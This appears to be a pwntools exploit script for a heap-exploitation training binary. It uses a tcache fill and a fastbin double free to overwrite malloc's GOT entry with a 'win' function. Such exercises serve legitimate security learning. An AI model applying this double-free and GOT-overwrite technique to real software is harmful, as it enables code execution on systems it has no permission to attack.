#!/usr/bin/python3
# ./attack.py GDB or ./attack.py
# To disable ASLR, run this first: setarch `uname -m` -R /bin/bash

from pwn import process, gdb, args, p64, ELF, context

binary = './gym'

gs = """
break main
break act_edit
continue
"""

e = ELF(binary)

context.aslr = False

END_OF_MENU = "e.g, l\n"


def malloc(p, size=8):
    p.sendline(b"m %d" % size)
    print("m %d" % size)
    print(p.recvuntil(END_OF_MENU).decode())


def free(p, index):
    p.sendline(b"f %d" % index)
    print("free")
    print(p.recvuntil(END_OF_MENU).decode())


def edit(p, index, content):
    p.sendline(b"e %d %b" % (index, content))
    print(b"e %d %b" % (index, content))
    print(p.recvuntil(END_OF_MENU).decode())


def exit(p):
    p.sendline(b"0")


def list_ptr(p):
    p.sendline(b"l")
    print(p.recvuntil(END_OF_MENU).decode())


def get_smallbin(p, base):
    for _ in range(8):
        malloc(p, 0x90)

    for i in range(8):
        free(p, i + base)


def launch_attack(p):
    # 1. fill tcache
    for _ in range(9):
        malloc(p)  # index 0 - 9
    for i in range(7):
        free(p, i)

    # 2. free three chunks and put them into fastbin
    free(p, 7)
    free(p, 8)

    # 3. trigger double free
    # fastbin: 7 -> 8 -> 7
    free(p, 7)

    # 4. get the victim pointer
    for _ in range(7):
        malloc(p)  # index 9 - 15

    malloc(p)  # index 16, same as 7

    list_ptr(p)
    edit(p, 16, p64(e.got["malloc"]))

    malloc(p)  # index 17, same as index 8
    malloc(p)  # index 18, same as index 7
    malloc(p)  # index 19, victim

    edit(p, 19, p64(e.symbols.win))

    p.interactive()


def main():
    if args.GDB:
        p = process(binary, aslr=False)
        gdb.attach(p.pid)
    else:
        p = process(binary, aslr=False)

    p.recvuntil(END_OF_MENU)
    launch_attack(p)

    # Make sure that this is kept for gdb
    # p.interactive()


if __name__ == "__main__":
    main()
